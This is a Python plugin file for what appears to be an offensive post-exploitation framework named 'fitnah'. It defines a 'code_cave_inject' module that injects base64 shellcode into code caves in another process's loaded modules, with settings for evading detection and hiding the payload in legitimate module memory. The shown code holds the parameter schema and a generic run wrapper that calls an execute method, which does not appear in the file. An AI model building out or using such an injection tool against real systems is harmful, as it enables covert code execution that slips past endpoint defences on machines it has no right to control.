"""execution/code_cave_inject — Inject shellcode into unused memory regions (code caves) in loaded modules. MITRE T1574"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre
import base64
import struct
import hashlib
import random
import ctypes
from ctypes import wintypes


class CodeCaveInject(BasePlugin):
    NAME        = "code_cave_inject"
    DESCRIPTION = "Find unused memory regions (code caves) in loaded modules and inject shellcode without calling VirtualAlloc. Hides payload in legitimate module memory."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1574"
    CATEGORY    = "execution"
    schema      = ParamSchema().add(
        Param("pid", int, required=True, help="Target process PID (0 for current process)"),
        Param("shellcode_b64", str, required=True, help="Base64 encoded shellcode to inject"),
        Param("min_cave_size", int, required=False, default=1024,
              help="Minimum code cave size in bytes (default: 1024)"),
        Param("max_cave_size", int, required=False, default=65536,
              help="Maximum code cave size in bytes (default: 65536)"),
        Param("search_type", str, required=False, default="executable",
              help="Search type: executable (only executable caves) | writable (only writable caves) | any (any cave)"),
        Param("module_filter", str, required=False, default="all",
              help="Module filter: all | system (only system modules) | user (only user modules) | specific (use module_name)"),
        Param("module_name", str, required=False, default="",
              help="Specific module name to search (e.g., ntdll.dll, kernel32.dll)"),
        Param("evasion", bool, required=False, default=True,
              help="Enable advanced evasion techniques (memory randomization, anti-detection)"),
        Param("cleanup", bool, required=False, default=True,
              help="Clean up after injection (restore original bytes)"),
        Param("auto_select", bool, required=False, default=True,
              help="Automatically select best code cave for injection"),
    )
    
    def run(self, session, params, ctx=None):
        """
        Main plugin execution method
        
        Args:
            session: Fitnah session object
            params: Plugin parameters
            ctx: Execution context (optional)
            
        Returns:
            ModuleResult with execution results
        """
        from fitnah.sdk import ModuleResult
        
        try:
            # Execute the plugin
            result = self.execute(params)
            
            if result.get("success", False):
                return ModuleResult.ok(
                    message=result.get("message", "Plugin execution successful"),
                    data=result.get("data", {})
                )
            else:
                return ModuleResult.err(
                    message=result.get("message", "Plugin execution failed"),
                    error=result.get("error", {})
                )
                
        except Exception as e:
            return ModuleResult.err(
                message=f"Exception during plugin execution: {str(e)}",
                error={"exception": str(e)}
            )